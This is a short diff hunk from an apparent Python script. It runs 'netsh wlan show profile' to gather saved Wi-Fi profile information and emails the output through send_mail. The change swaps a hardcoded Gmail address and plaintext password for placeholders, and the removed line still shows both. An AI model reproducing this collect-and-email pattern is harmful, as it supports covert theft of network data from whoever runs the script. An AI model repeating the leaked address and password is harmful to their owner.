@@ -14,4 +14,4 @@ command = "netsh wlan show profile"
 # Executes command and returns results
 result = subprocess.check_output(command, shell=True)
 
-send_mail("dex210199@gmail.com", "dexter2013", result)
+send_mail(" -- Enter Email Here --", "$PASSWORD", result)
